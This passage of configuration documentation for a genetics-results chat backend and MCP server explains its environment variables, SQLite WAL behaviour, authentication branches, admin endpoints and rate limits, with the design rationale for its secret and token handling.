| `INTERNAL_API_SECRET` | Shared secret sent as `Authorization: Bearer` on every call to results-api and the BigQuery proxy. Optional only for a local run against services that require no internal auth: since `genetics-results-suite-618` the **deployed** entrypoints refuse to start without it (`config.settings.require_internal_api_secret()`, called from `mcp_server.main()` on the remote transports and from `chat_api`'s lifespan when `REQUIRE_AUTH` is true), because the alternative was sending every call **anonymously** with no local signal and nothing in the far end's log to tell it apart from an authenticated one. Only attached to `ToolExecutor.client` — the separate `external_client` carries no default auth, so the secret can never leak to a third-party API such as MouseMine or myvariant.info. The pruned sandbox install holds none by design and uses `SANDBOX_TOKEN_FILE` instead; since `genetics-results-suite-4h6.44` it is no longer exempt from needing *a* credential — a pruned install with neither raises `SandboxCredentialError` at client construction | - |
| `SANDBOX_TOKEN_FILE` | Path (never the tokens) to the per-execution token file the sandbox supervisor writes before it forks — a JSON object keyed by audience, `{"db-api": ..., "results-api": ...}`. Read **once** and unlinked on the first client build (`tools/executor.py`), then attached per request bound to the destination's audience; mutually exclusive with `INTERNAL_API_SECRET`, and a file that does not yield a usable pair raises rather than degrading to no credential. Set only by the supervisor in the sandbox image; unset everywhere else. Read-once-and-unlink is **not** an exposure bound — see `genetics-results-suite-4h6.55` | - |
| `CHAT_BACKEND_URL` | Base URL of the chat backend, used by the MCP server to validate per-user API tokens via `POST /v1/tokens/validate` when the two services do not share a filesystem. Authenticated with `INTERNAL_API_SECRET` | - |
| `SANDBOX_ENABLED` | Whether a sandbox supervisor is actually serving `SANDBOX_URL`. False withholds `run_analysis` from every resolved tool list — and, since the prompt is built from that list, its guidance too. A deployment fact, flipped by the deploy that creates the sandbox | `false` |
| `SANDBOX_URL` | Base URL of the code-execution sandbox supervisor. **One value, deliberately** — it names the in-cluster Service in production and the local Docker container in development, and `sandbox_client.py` branches on nothing else, because the wire contract is identical in both deployments | `http://127.0.0.1:8080` |
| `GATEWAY_IDENTITY_SECRET` | The provenance secret auth-gateway sends as `X-Gateway-Auth` on its two chat locations, after it has verified an oauth2-proxy session. Held by auth-gateway and chat-backend **only** — not mcp-server, not results-api, not the sandbox — which is what makes it a fact those services cannot forge by choosing a header. Sandbox dispatch (`run_analysis`) requires it; nothing else does. Unset or non-ASCII under `REQUIRE_AUTH=true` refuses every dispatch and logs an `ERROR` at startup, never the reverse | - |
| `SANDBOX_TOKEN_SIGNING_KEY` | HS256 key for the per-execution sandbox tokens, held only by chat-backend (mint) and db-api/results-api (verify). Separate from `INTERNAL_API_SECRET` on purpose: separate blast radius, independent rotation, and the sandbox holds neither. Unset means **no execution runs** — `mint_execution_tokens` raises `SandboxTokenUnavailable` rather than returning `None`, since every fallback is either "send no credential" or "send the shared secret" | - |

### LLM providers (for chat API)

| Variable | Description | Default |
|----------|-------------|---------|
| `ANTHROPIC_API_KEY` | Anthropic API key for Claude | - |
| `OPENAI_API_KEY` | OpenAI API key | - |
| `DEFAULT_MODEL` | Default chat model | `claude-opus-5` |
| `TEMPERATURE` | Sampling temperature. Unset by default: `model_rejects_temperature()` (in `settings.py`) knows that Fable and Opus 4.7+ reject the parameter outright, so it is opt-in for the models that still accept it | unset |
| `MAX_TOKENS` | Output token ceiling per model call. Caps thinking and visible text together; only generated tokens are billed, so headroom is cheap, but one turn must still finish inside the 5-minute per-iteration timeout | `16384` |
| `MAX_CONTINUATIONS` | How many times a turn stopped by `stop_reason: max_tokens` is resumed before the truncation is reported to the user | `3` |
| `APP_NAME` | Product/brand name substituted into the assistant persona system prompt | `FinnGenie` |

### myvariant.info (optional, chat-backend only)

| Variable | Description | Default |
|----------|-------------|---------|
| `MYVARIANT_API_URL` | myvariant.info API base URL | `https://myvariant.info/v1` |

### UniProt (optional, chat-backend only)

| Variable | Description | Default |
|----------|-------------|---------|
| `UNIPROT_API_URL` | UniProt REST API base URL (entries, search, sequences) | `https://rest.uniprot.org` |
| `EBI_PROTEINS_API_URL` | EBI Proteins API base URL (protein↔genome coordinate mapping) | `https://www.ebi.ac.uk/proteins/api` |
| `UNIPROT_CACHE_TTL` | TTL in seconds for cached UniProt responses; `0` disables caching | `86400` (24 h) |

### Search tools (optional)

| Variable | Description |
|----------|-------------|
| `TAVILY_API_KEY` | Tavily API key for web search |
| `PERPLEXITY_API_KEY` | Perplexity API key for literature search |
| `LITERATURE_SEARCH_BACKEND` | Backend when the chat request carries no `literature_backend`: `perplexity` (default) or `europepmc`. The model cannot select a backend |

### Database and storage

| Variable | Description | Default |
|----------|-------------|---------|
| `LLM_CONFIG_DB` | Path to LLM config SQLite DB | `/path/to/llm_config.db` |
| `CHAT_HISTORY_DB` | Path to chat history SQLite DB | `/path/to/chat_history.db` |
| `ATTACHMENT_STORAGE_PATH` | Path for file attachment storage | `/path/to/attachments` |
| `MAX_ATTACHMENT_SIZE` | Max attachment size in bytes | `52428800` (50MB) |
| `MAX_MESSAGE_CHARS` | Max typed-text characters in a single user message (excludes attachments) | `50000` |
| `MAX_REQUEST_CHARS` | Cap on total text across **all** messages in one chat request, images excluded. Deliberately generous — replayed tool results are legitimately far larger than a typed message — so it bounds the payload rather than policing use | `2000000` |
| `MAX_MESSAGES_PER_REQUEST` | Cap on the number of messages in one chat request | `500` |
| `MAX_ATTACHMENTS_PER_MESSAGE` | Max attachment blocks (image/document/inlined data file) per message | `10` |
| `DOWNLOAD_STORAGE_PATH` | Path for tool result download files | `/mnt/disks/data/downloads` |
| `DOWNLOAD_TTL_SECONDS` | TTL for download files in seconds | `2592000` (30 days) |

**Both SQLite databases run in WAL mode**, set by `_create_connection` in `chat_history_db.py`
and `llm_config_db.py`. Under the default rollback journal a reader is refused while a write is
being applied (commit takes an EXCLUSIVE lock), and a writer's commit is refused while any
reader still holds a read transaction; WAL removes both directions. For `llm_config.db` the
mixed read+write hot path is API-token validation: `validate_api_token` runs a SELECT plus a
bookkeeping UPDATE and COMMIT on every MCP request (`mcp_server.py:_validate_user_token`, and
`routers/api_tokens.py` for the cross-pod HTTP fallback). The per-request settings,
tool-description and instruction-set reads and writes in `routers/llm_config.py` hit the same file
from the same process, as does the instruction-set lookup on every chat turn that names one. Journal mode is a property of the file, not of the connection: the pragma converts an
existing database once (preserving its contents) and is a no-op on every connection after that,
so no migration step is involved and an image without the pragma still reads the converted file.
That one-time conversion, unlike the no-op, does need the write lock and raises
`database is locked` if another connection is mid-transaction — but it runs inside
`LLMConfigDB.__init__`, before the `Singleton` metaclass publishes the instance or
`get_llm_config_db` assigns it, and a failure there is self-healing: `_llm_config_db` is left
`None`, so the next request constructs it again.
WAL leaves `-wal` and `-shm` files beside the database on the `chat-data` PVC; the backup is a
block-level GCE disk snapshot of that PVC, so they are captured with it and recovered on next
open. `synchronous` and `busy_timeout` are left at their defaults (`FULL`, 5s) in both, so
durability is unchanged — but availability on a read-only or full volume is not. The pragma is
unconditional and `_create_connection` is the connection-cache factory, so if it raises, no
connection exists at all and reads fail with it: a read-only database file or directory now
fails at `attempt to write a readonly database` during construction instead of degrading to
working reads, and a WAL database cannot be opened on a full filesystem because opening one
creates a 32 KB `-shm`. Nothing is lost — everything reads again once the volume is writable —
and that read-only condition has occurred on this PVC before (see the `CAP_DAC_OVERRIDE` note
in `genetics-results-suite/k8s/deployments/chat-backend.yaml`), but `chat_history_db.py` has
had the same property on the same PVC all along, so the service is already broken in those
scenarios. The pod itself stays `Running` and `Ready` throughout — both probes hit `/healthz`
(`chat_api.py`), which returns `{"status": "ok"}` without touching a database — so what fails is
every request that reaches SQLite, not the pod.

Reverting is a code change, not a data migration: drop the pragma and run
`PRAGMA journal_mode = DELETE` once, which checkpoints the WAL back into the database and
removes the sidecars. It needs *nothing* holding the file open, which a rolling restart does not
give you — `get_llm_config_db`/`get_chat_history_db` open the file on the first request that
touches it and cache the connection for the process lifetime, so any chat-backend pod that has
served traffic still holds it, and against a running pod the pragma raises `database is locked`
and leaves the sidecars in place. `replicas: 1` with a `Recreate` strategy only guarantees that
no two pods hold the file at once. Scale the deployment down first:

```bash
kubectl -n genetics scale deploy/chat-backend --replicas=0
# then run the pragma against /data/llm_config.db from a one-shot Job or debug pod
# that mounts the chat-data PVC, and scale back up:
kubectl -n genetics scale deploy/chat-backend --replicas=1
```

For `llm_config.db` a scaled-down chat-backend is the only holder. `chat_history.db` has a
second one: the `analyze-conversations` CronJob
(`genetics-results-suite/k8s/deployments/analyze-conversations-cronjob.yaml`) mounts the same
PVC read-write and opens that database nightly at 02:30, so suspend it as well before reverting
that file. A collision only makes the pragma fail loudly; it does not corrupt anything.

**Which version of a config row is "current", and how its timestamp is read.** The
tool-description and user-setting tables in `llm_config.db` are append-only histories, and
`changed_at` is `CURRENT_TIMESTAMP` with one-second resolution, so two saves to the same key
inside one second tie on it. The winner is the `(changed_at, id)` maximum in every accessor —
`id` is an AUTOINCREMENT sequence, so it orders tied rows by the order they were written — which
is why the singular reads order by `changed_at DESC, id DESC` and the plural ones take `MAX(id)`
within the `MAX(changed_at)` group. No timestamp column in the file carries `NOT NULL` or a
format check, so a row written by a migration or a manual fix can hold a NULL or an unparseable
string. Such a stamp degrades to the epoch (`_as_utc_or_epoch`) rather than raising: these are
admin and config reads behind `routers/llm_config.py`, and one unusable row must not 500 a whole
listing. (A chat turn does not reach them — it takes its verbosity off the request body.) The
plural queries join on `IS` rather than `=`, so a key whose rows are *all* unstamped still
resolves to its `MAX(id)` row — the row the singular accessor returns for it — instead of
dropping out of the listing. Only the equality is relaxed: an unstamped row never outranks a
stamped one for the same key, since `MAX` ignores NULLs. `IS` and not a `COALESCE` on both sides:
coalescing is null-safe too, but it collapses the NULL rows onto whichever row holds the sentinel,
and the cost splits by sentinel. Coalescing to `''` or `0` cannot cost a key its usable stamp —
a real stamp outranks both in `MAX`, since `''` sorts below every other string and every integer
below every string — but in a key where *no* row is usably stamped the plural read then takes the
group's highest id, unstamped or not, while the singular one keeps returning the sentinel row, so
the two disagree whenever the unstamped row is the newer.
Coalescing to `CURRENT_TIMESTAMP` is the one that costs both: it equals every row written in the
current second, so the NULL rows collapse onto a usably stamped row and `MAX(id)` can hand the key
to an unstamped one. Timestamps come back from these reads as timezone-aware UTC, because SQLite
stores `CURRENT_TIMESTAMP` as naive UTC and the API serializes them with `.isoformat()`; the saves
and `get_tool_description_history` return aware UTC too, so a `PUT` response and the following
`GET` on one key no longer differ by the process's UTC offset (they still differ in precision —
the save reports `now()` to the microsecond, the read the stored second) and the history head
string-matches the description in force. The `user_comments` accessors now follow
(`genetics-results-suite-ni9`): `get_user_comments` and `list_all_user_comments` parse through
`_as_utc_or_epoch` like the config reads, and `add_user_comment` hands back aware UTC instead of
naive *local*, so a `POST` response and the `GET` of the same row no longer differ by the
process's offset. `list_all_user_comments` is the one that had to stop raising — it backs
`GET /chat/v1/admin/feedback`, so one unusable row 500'd the whole feed. Both halves of that feed
moved together: `chat_history_db.list_sessions_with_comments` returns aware UTC as well, and for
the merge that is the point rather than a tidy-up. The merge key is `(created_at, source, id)`
with `created_at` an `.isoformat()` string, so an aware stamp renders 25 characters against a
naive one's 19; had only one side moved, the shorter string would sort below the longer at every
exact tie and settle it by the suffix instead of by the `(source, id)` tiebreak that is there to
decide it. The key stays total either way, but only with both sides aware does it order ties the way
`genetics-results-suite-qdf` set out. `list_sessions_with_comments` also gained the `id` tiebreak
its `ORDER BY` was missing, so each source's own order is decided before the merge sees it.

### CORS

| Variable | Description | Default |
|----------|-------------|---------|
| `CORS_ORIGINS` | Comma-separated origins allowed to call the chat API from a browser | `http://localhost:3000,http://127.0.0.1:3000` |

The frontend calls the chat API with `withCredentials: true`, and browsers reject a wildcard
`Access-Control-Allow-Origin` on credentialed requests, so origins are listed explicitly
(`settings.cors_origins`, applied in `chat_api.py`). This only matters in dev, where the frontend
runs on its own origin; in prod the frontend and chat API share an origin behind the reverse proxy,
so no cross-origin request is made.

### Authentication (optional)

| Variable | Description |
|----------|-------------|
| `REQUIRE_AUTH` | Require `X-Goog-Authenticated-User-Email` header (`true`/`false`) |
| `MCP_API_KEY` | Comma-separated bearer tokens for MCP server SSE/HTTP transport auth. **Required** for those transports: `main()` exits with an error rather than starting an unauthenticated remote server |
| `MCP_ALLOW_QUERY_TOKEN` | Also accept the token in a `?token=XXX` query parameter (`true`/`false`, default `false`) |
| `API_TOKEN_TTL_DAYS` | Days of inactivity after which a per-user API token expires; every use pushes the deadline out again. `0` disables expiry. Does not apply to `MCP_API_KEY` (default `90`) |
| `GOOGLE_TOKEN_AUDIENCE` | Comma-separated OAuth client ids a Google Identity Token's `aud` must be one of. Unset means the audience is not checked at all. The deployed value is the gcloud CLI's *public* client id, so it buys cross-OAuth-client replay protection only — not identity, and not replay by another service documenting the same gcloud flow (see branch 3 below) |
| `ALLOWED_EMAILS` | Comma-separated email allow-list shared by all JWT bearer paths (Google Identity Token and Keycloak) |
| `ALLOWED_EMAIL_DOMAINS` | Comma-separated email-domain allow-list shared by all JWT bearer paths (default: `finngen.fi`) |
| `OAUTH_ISSUER` | Keycloak realm issuer URL; enables the OAuth resource-server bearer path when set together with `OAUTH_RESOURCE_URL` |
| `OAUTH_RESOURCE_URL` | Expected `aud` claim (this server's canonical URL) for Keycloak access tokens |
| `OAUTH_JWKS_URI` | Override for the JWKS endpoint; defaults to `<OAUTH_ISSUER>/protocol/openid-connect/certs` |

Tokens are supplied as an `Authorization: Bearer XXX` header. A `?token=XXX` query parameter is also accepted, but only when `MCP_ALLOW_QUERY_TOKEN` is set — off by default, because a credential in a URL is captured where request headers are not: the GKE load balancer's request logs (upstream of the auth-gateway's `token=` redaction), browser history, and the `Referer` header of any outbound link. Enable it only for a client that genuinely cannot set the header (e.g. claude.ai). The query parameter is consulted only when no Bearer header is present, so the header always takes precedence, and a request with neither gets 401.

The bearer auth middleware (`_wrap_with_bearer_auth` in `mcp_server.py`) routes each presented token through four branches in order, mirroring the results-api implementation:

1. **`MCP_API_KEY` shared secret** — constant-time compare against each configured value, on the UTF-8 **bytes** of both sides. `hmac.compare_digest` raises `TypeError` when handed a `str` containing non-ASCII, and `api_keys` is non-empty whenever this wrapper is installed, so every non-ASCII bearer reached at least one comparison — and since this is raw ASGI middleware with no exception handler above it, that surfaced as a **500 rather than a 401** (`genetics-results-suite-zyi`; the fourth instance of this bug in the suite, after results-api, chat-backend's `api_tokens.py` and db-api — `auth/core.py` here was converted to bytes by `genetics-results-suite-th2` but this call site was missed). The raw `authorization` header bytes are also decoded inside a `try`: an `Authorization` value that is not valid UTF-8 raised `UnicodeDecodeError` on the same path, and is now treated as an absent credential, i.e. a 401. The `?token=` fallback below carried the same defect a third time — `scope["query_string"].decode()`, unguarded, a `UnicodeDecodeError` straight out of raw ASGI — and is now caught the same way, an undecodable query string finding no token and falling through to the 401 (`genetics-results-suite-tzi`). All three are pinned in `tests/test_mcp_server.py`, which builds the ASGI scope with raw bytes because httpx refuses to encode a non-ASCII header value or query string and would otherwise fail in the client rather than the server. This gate keeps **UTF-8 on both sides** deliberately, unlike `auth/core.py` below, and no starlette is involved: it decodes the raw ASGI header bytes itself, with UTF-8, so re-encoding with UTF-8 reproduces the wire bytes exactly and anything undecodable is already a 401 before the comparison. Note what switching it would and would not do — switching only the encode would raise `UnicodeEncodeError`, i.e. the 500 this whole line exists to prevent, and switching the decode and the encode together would not change *which* tokens are accepted (the expected side is valid UTF-8 by construction), only where an undecodable value is rejected.
2. **Keycloak OAuth access token (JWT)** — only attempted when `OAUTH_ISSUER` and `OAUTH_RESOURCE_URL` are both set (`settings.oauth_enabled`). If the token contains `.` it is verified with PyJWT against Keycloak's JWKS (fetched and cached via a per-URI singleton `jwt.PyJWKClient`): RS256 signature, `iss == OAUTH_ISSUER`, `aud` includes `OAUTH_RESOURCE_URL` (string or list), and `exp` not expired. The email is taken from the `email` claim (falling back to `preferred_username` only when it is itself an email) and checked against the same `ALLOWED_EMAILS` / `ALLOWED_EMAIL_DOMAINS` allow-list. Any failure (wrong iss/aud/signature, expired, or a JWKS network error) is non-fatal and **falls through** to branch 3 rather than 500-ing.
3. **Google Identity Token (JWT)** — if the token contains `.` it is validated via `google.oauth2.id_token.verify_oauth2_token` using a lazily-initialized singleton `google.auth.transport.requests.Request` (for JWKS caching). The payload must have `email_verified == True`; the email must satisfy the same allow-list (otherwise 401/403). Identity is set to the verified email. `verify_oauth2_token` **skips the `aud` claim when no audience is passed**, so `_audience_allowed` additionally requires `aud ∈ GOOGLE_TOKEN_AUDIENCE` — without it a token minted for a different OAuth client would be accepted as long as its email is allow-listed. The check is inert (with a warning logged per token) while `GOOGLE_TOKEN_AUDIENCE` is unset; the deployment sets it to the gcloud CLI's **public** client id, which is what `gcloud auth print-identity-token` issues — for *everyone*, so what the check is worth is **cross-OAuth-client** replay protection and not identity: it rejects a token addressed to a different client id (ADC's `764086051850-…`, a project-owned client), but *not* one the same user handed to another homegrown service that documents this same `gcloud auth print-identity-token` flow, because that token carries the identical `aud`. The email allow-list carries the whole of the authorization. **This branch is deprecated (still supported, and not being switched off without notice): branch 4 is the recommended programmatic credential.** A project-owned audience was considered and rejected — `gcloud auth print-identity-token` on user credentials cannot request a custom audience, so it would 401 every human caller. Full decision record: `genetics-results-suite/docs/project-spec.md`, "Programmatic credentials: why the per-user API key, not the Google id_token".
4. **Per-user API token** — the recommended programmatic credential, and the one users are pointed at. Fall back to validating against the local LLM config DB (SHA-256 hashed) or via the chat-backend `/v1/tokens/validate` endpoint. Users create tokens from the browser's "MCP and API keys" dialog, i.e. the chat API (`POST /chat/v1/tokens`). That endpoint is `Depends(auth_required)`, which needs the internal-secret marker plus an allow-listed oauth2-proxy identity header, so **no bearer token can mint a token** — a headless caller (CI, service account) needs a human to sign in once and create its key, after which the key works headlessly. Unlike a Google id_token this deployment issues it, can revoke it per user, and ages it out on 90-day idleness.

**Token expiry is idle-based, not absolute.** `user_api_tokens.expires_at` is a *rolling* deadline: `validate_api_token` rejects a token once the deadline has passed, and otherwise pushes it forward to `now + API_TOKEN_TTL_DAYS` (default 90; `0` disables expiry) in the same statement that updates `last_used_at`. A token in regular use therefore never expires, while an abandoned or quietly-leaked one stops working on its own. Rows predating the column have `expires_at IS NULL` and are judged on `COALESCE(last_used_at, created_at) + TTL`, so an actively-used legacy token is not killed the first time it is presented. Timestamps are written in SQLite's own `%Y-%m-%d %H:%M:%S` UTC form so the column stays lexicographically sortable alongside `CURRENT_TIMESTAMP` values; `_as_utc` accepts both that and ISO-8601 when reading. Pushing the deadline is bookkeeping, not part of the decision: it is the one write in `LLMConfigDB` whose failure is logged and swallowed rather than raised, so a locked or full database cannot reject a token the SELECT has already accepted. Every other write accessor rolls back and re-raises, and each of them (reads included) discards a transaction found open on the thread's cached connection, so no failure can hold the write lock against the other writers of `llm_config.db`. `chat_history_db.py` now carries the same guard (`genetics-results-suite-4um`): WAL made the trigger rarer there, not impossible, and a failed COMMIT is unaffected by journal mode. The methods that run several DMLs under one commit — `add_message` (message plus the session touch), `fork_session` (the session plus every copied message), `upsert_analysis` (the analysis row plus its issue rows) — put all of their statements inside the one `try`, so a failure partway leaves neither half rather than a session holding a truncated conversation. The discard on entry cannot cost them anything: each runs it once before its own first statement, and no accessor calls another after opening a transaction (`fork_session`'s only nested read runs before its first `INSERT`).

Note that neither the shared `MCP_API_KEY` path nor this per-user path logs anything on success, so **mcp-server logs cannot attribute usage to a user for either** — only the Google-JWT and Keycloak branches emit an `authenticated … user: <email>` line. `user_api_tokens.last_used_at` is the only per-user record of API-token usage — and only when it can be written: the update is swallowed on failure (see above), so under a locked or full database the request is still authenticated and the sole trace is the `could not record use of API token id=…` WARNING, which names the token id but not the user.

In deployment, `ALLOWED_EMAILS` and `ALLOWED_EMAIL_DOMAINS` are sourced from the shared `bearer-auth-allowed` Kubernetes ConfigMap (defined in `genetics-results-suite/k8s/configs/`), which is also consumed by results-api so both services share an identical allow-list.

### Admin page

| Variable | Description | Default |
|----------|-------------|---------|
| `ENABLE_ADMIN_PAGE` | Enable admin page and API endpoints | `false` |
| `ADMIN_USERS` | Comma-separated admin email addresses | `""` |

When `ENABLE_ADMIN_PAGE=true`, admin endpoints are available at `/chat/v1/admin/`. Access control depends on `REQUIRE_AUTH`:
- `REQUIRE_AUTH=false` (dev mode): any user can access admin endpoints
- `REQUIRE_AUTH=true`: only users listed in `ADMIN_USERS` can access admin endpoints

`REQUIRE_AUTH` is read in exactly one place, `settings.require_auth`. `auth.dependencies` used to
snapshot it into a module global at import time while `chat_api.py`'s `/chat/v1/auth` re-read
`os.environ` per request; production never disagreed (nothing in `src/` writes `os.environ` at
runtime), but the two could not be moved together in a test, so the `is_admin` the frontend shows
its admin UI on could contradict the `admin_required` gate on the endpoints behind it
(`genetics-results-suite-pol`). The global is gone rather than aliased, so a test still patching
`auth.dependencies._require_auth` now fails loudly; use `conftest.settings_env(REQUIRE_AUTH=…)`,
which patches the environment and rebuilds the cached `Settings`. Routing the gate through
`Settings` does **not** change which sources are visible: `chat_api.py` calls `load_dotenv()`
before it imports the auth dependencies and is their only importer, so the old global already saw
`.env`. What it changes is that a `Settings` instance cannot exist before `config/settings.py`'s own
module-level `load_dotenv()`, so the ordering hazard is structurally impossible rather than merely
untriggered. In k8s the variable is set in the container env either way.

`INTERNAL_API_SECRET` now goes through the same field, `settings.internal_api_secret`
(`genetics-results-suite-avt`). It had four independent readers — `auth/dependencies.py` and
`routers/api_tokens.py` snapshotted it at import, `tools/executor.py` and `mcp_server.py` read it
live — so the four could disagree. It was fail-closed throughout (an empty secret skips the bearer
branch entirely and falls through to requiring the IAP header, rather than comparing against `""`),
and `tests/test_internal_api_secret.py` now pins both that and the agreement of all four consumers
by setting the environment *after* import, which is exactly what a snapshot cannot see.

**The identity header is not a credential on its own** (`genetics-results-suite-th2`). Anything
that can reach chat-backend on the pod network can set `X-Goog-Authenticated-User-Email` to any
string, so `auth/core.py:get_authenticated_user` honours it only when the request also carries the
trusted-proxy marker, and then holds the address to `ALLOWED_EMAILS`/`ALLOWED_EMAIL_DOMAINS` (which
fails open, with a warning, when a deployment configures neither). `auth/dependencies.py:auth_required`
resolves: marker + allow-listed header → that user; marker + non-allow-listed header → 401, never a
downgrade to `mcp-tool`; marker alone → `mcp-tool`; header alone → 401.

`auth/core.py:is_internal_caller` is the **single** place `INTERNAL_API_SECRET` is compared, and it
accepts the marker in either transport:

- `X-Internal-Auth: <secret>` — auth-gateway's, on the two locations proxying browser traffic here
  (`/chat/v1/` and `= /status`). A dedicated header rather than `Authorization` so that a
  chat-backend still on the previous image ignores it: with the marker on `Authorization`, the old
  code matches the bearer *before* it reads the identity header, and every browser user during the
  gateway-leads-backend rollout window would have resolved to the one `mcp-tool` identity — owning
  their sessions, messages, downloads and API tokens permanently.
- `Authorization: Bearer <secret>` — results-api's and mcp-server's, unchanged. Service-to-service
  callers with no `Authorization` of their own to displace.

The two are equivalent **here** — this answers "is the caller in-cluster", and both are.
Deliberately so: the transport carries no authority, since any holder of the secret can pick
either one. Sandbox dispatch keys on a different fact and a different key
(`genetics-results-suite-4h6.84`): `auth/core.py:is_gateway_caller` compares
`GATEWAY_IDENTITY_SECRET` from `X-Gateway-Auth` — a secret auth-gateway and chat-backend hold
and mcp-server and results-api do not — and `auth/dependencies.py:gateway_asserted_identity`
reduces "that secret **and** an identity header" to one boolean, which `POST /chat/v1/chat`
passes down to `run_analysis` (see "the dispatch requires a secret only auth-gateway holds"
above). `auth_required`'s precedence is unchanged: every route other than sandbox dispatch is
legitimately reachable by any marker holder.

Both compare as **bytes**: `hmac.compare_digest` on `str` raises `TypeError` for a non-ASCII value,
and a 500 from a forged header is a worse failure mode than a 401. **The two sides use different
codecs on purpose** (`genetics-results-suite-ctq`): the presented value is re-encoded **latin-1**,
which undoes exactly how starlette decoded the raw header bytes (verified on the pinned starlette
0.50.0) — UTF-8 re-encoded the mojibake instead (`b"s\xc3\xa9cret"` came back out as
`b"s\xc3\x83\xc2\xa9cret"`). `INTERNAL_API_SECRET` stays **UTF-8**. This is *not* justified by
"callers transmit it UTF-8-encoded": measured off a real socket, the clients disagree with each
other — node fetch/undici (the browser BFF) and python-requests put latin-1 on the wire, aiohttp
puts UTF-8, and httpx 0.28, which is this repo's own client, refuses to send a non-ASCII header
value at all (`UnicodeEncodeError` client-side). Byte-exactness across all callers is therefore
unachievable, and under a hypothetical non-ASCII secret this pairing would authenticate the
aiohttp-shaped caller and 401 the BFF-shaped one — the reverse of the old UTF-8/UTF-8 pairing.
What makes the comparison well defined is the **ASCII invariant**, now enforced rather than
assumed: `config.require_internal_api_secret` — the startup check the deployed entrypoints already
call (`genetics-results-suite-618`) — additionally refuses a non-ASCII secret, so the pod fails
readiness and the rollout stalls with the old pods still serving instead of every internal call
401ing at request time. It stays silent for an unset secret in the sense that matters: an unset
secret still gets 618's own message, and the paths that legitimately have none (a local run, the
sandbox image) never call it. Every codec coincides on ASCII, so nothing observable changed.
There is no `try/except UnicodeEncodeError` around the re-encodes as there is in results-api,
because this `is_internal_caller` takes a starlette `Request` and can only see a str starlette
itself latin-1-decoded; the comment there says so. `tests/test_auth_header_trust.py` pins the
ASCII case, the UTF-8-wire case, and — with a hand-built ASGI scope — which raw wire bytes
authenticate under a non-ASCII secret, which TestClient cannot express because
`starlette/testclient.py` re-encodes httpx's decoded header str as UTF-8.
`tests/test_internal_api_secret.py` pins the startup guard. `POST /chat/v1/tokens/validate`
is the only route with no auth dependency; it calls the same helper (it used to repeat the
comparison, on `str`, and drifted) and additionally rejects any request carrying an identity header,
since its genuine callers never assert one.

Admin endpoints:
- `GET /chat/v1/admin/sessions` — list all sessions with filters and pagination. Each session item carries conversation-analysis fields (LEFT JOINed from `conversation_analysis`): `disposition`, `issue_count`, `issue_categories` (list of strings), `llm_rating` (the `llm_quality_score`, 1-5 or null), `success_label`. Filters: `user`, `date_from`, `date_to`, `session_id`, plus analysis filters `disposition` (exact), `success_label` (exact), `min_issues` (keep sessions with `issue_count >= N`), and `rating`. The `rating` param is a **string**: `"1"`..`"5"` filter the exact LLM rating, and the sentinel `"NA"` filters to unrated sessions (no `llm_quality_score`, i.e. unanalyzed sessions or rows with a NULL score). NA is implemented via the `unrated: bool` param on `ChatHistoryDB.list_all_sessions` (`a.llm_quality_score IS NULL`). The paginated `total` reflects all active filters.
- `GET /chat/v1/admin/sessions/{id}` — session detail with all messages
- `GET /chat/v1/admin/analytics/usage?period=week|month|year` — daily usage stats (unique users, conversations)
- `GET /chat/v1/admin/analytics/quality` — raw per-conversation analysis rows for the Quality plots tab (`rows` of `session_id`, `created_at`, `llm_quality_score`, `llm_disposition`, `success_label`, `issue_categories`). Returned unaggregated (ordered by `created_at`); the frontend does the rolling-window aggregation client-side. Sourced from `ChatHistoryDB.list_all_analysis_rows`.
- `GET /chat/v1/admin/feedback` — unified, paginated feed of all user feedback sorted by `created_at` DESC. Merges two sources: standalone feedback from the `user_comments` table (submitted via the Feedback dialog) and per-session comments from `chat_sessions.comment`. Response includes `items` (each with `user`, `comment`, `preview`, `created_at`, `source`, and optional `session_id`), `total` count, `latest_at` timestamp, and pagination parameters (`offset`, `limit`). The merge is ordered by `(created_at, source, id)`, not `created_at` alone: `created_at` is `CURRENT_TIMESTAMP` in both tables and has one-second resolution, so submissions inside one second tie and neither query orders them, and a page is a slice of that order — a boundary inside a tie would show an admin one item twice and hide another. The two sources have separate id spaces (an autoincrement int, a session uuid), which never meet because `source` is compared first

The `/chat/v1/auth` endpoint includes an `is_admin` boolean in its response, used by the frontend to show/hide the admin menu.

### Rate limiting

| Variable | Description | Default |
|----------|-------------|---------|
| `RATE_LIMIT_PER_HOUR` | Max chat messages per user per hour | `20` |
| `RATE_LIMIT_PER_DAY` | Max chat messages per user per day | `100` |

Rate limiting is per user email (from `X-Goog-Authenticated-User-Email` header) and applies to `POST /chat/v1/chat`. Both limits use sliding windows. Returns HTTP 429 with the specific limit hit when exceeded.

### MCP server options

| Variable | Description |
|----------|-------------|
| `LOG_LEVEL` | Logging level: `DEBUG`, `INFO`, `WARNING`, `ERROR` (default `INFO`) |
| `MCP_DISABLE_TRANSPORT_SECURITY` | Allow all hosts/origins (dev only) |
| `EXTERNAL_MCP_SERVERS` | Comma-separated URLs of always-on external MCP servers (gnomAD, Open Targets) |
| `EXTERNAL_MCP_EXCLUDE_TOOLS` | Tool names to exclude from proxying |
| `ENABLE_CREDIBLE_SETS_STATS` | Enable `get_credible_sets_stats` tool (default `false`) |
| `ENABLE_PHENOTYPE_REPORT` | Enable `get_phenotype_report` tool (default `false`) |
| `SANDBOX_ENABLED` | Whether a sandbox supervisor is actually serving `SANDBOX_URL`. Enables `run_analysis` (default `false`) |
| `RAG_MCP_SERVER` | URL of the RAG MCP server (only included when `tool_profile` is `"rag"` or unset) |

These flags feed `settings.disabled_tools` (as does `ENABLE_SUBAGENTS`), which the MCP server, the chat API and the subagents all read, so a disabled tool is invisible on every surface rather than only unregistered on one.

Default external servers:
- gnomAD: `https://gnomad-mcp-dpsnoyqx6q-uc.a.run.app`
- Open Targets: `https://mcp.platform.opentargets.org`

### Subagent options

| Variable | Description | Default |
|----------|-------------|---------|
| `ENABLE_SUBAGENTS` | Enable the `launch_subagents` tool | `false` |
| `SUBAGENT_MODEL` | Model for subagents (falls back to `fast_model`) | `""` |
| `SUBAGENT_TIMEOUT` | Seconds per subagent execution | `120` |
| `SUBAGENT_ALLOWED_PATHS` | Comma-separated directories for file access | `""` |
| `ENABLE_SCRIPT_EXECUTION` | Allow subagents to execute scripts | `false` |
| `SUBAGENT_SCRIPT_TIMEOUT` | Seconds per script execution | `30` |

## Logging

The application uses structured JSON logging for GCP Cloud Logging via `logging_config.py`:

- **GCPJsonFormatter**: Outputs JSON with `timestamp`, `severity`, `logger`, `message`, and optional `exception` fields. On GKE, stdout is automatically captured by fluentbit and sent to Cloud Logging.
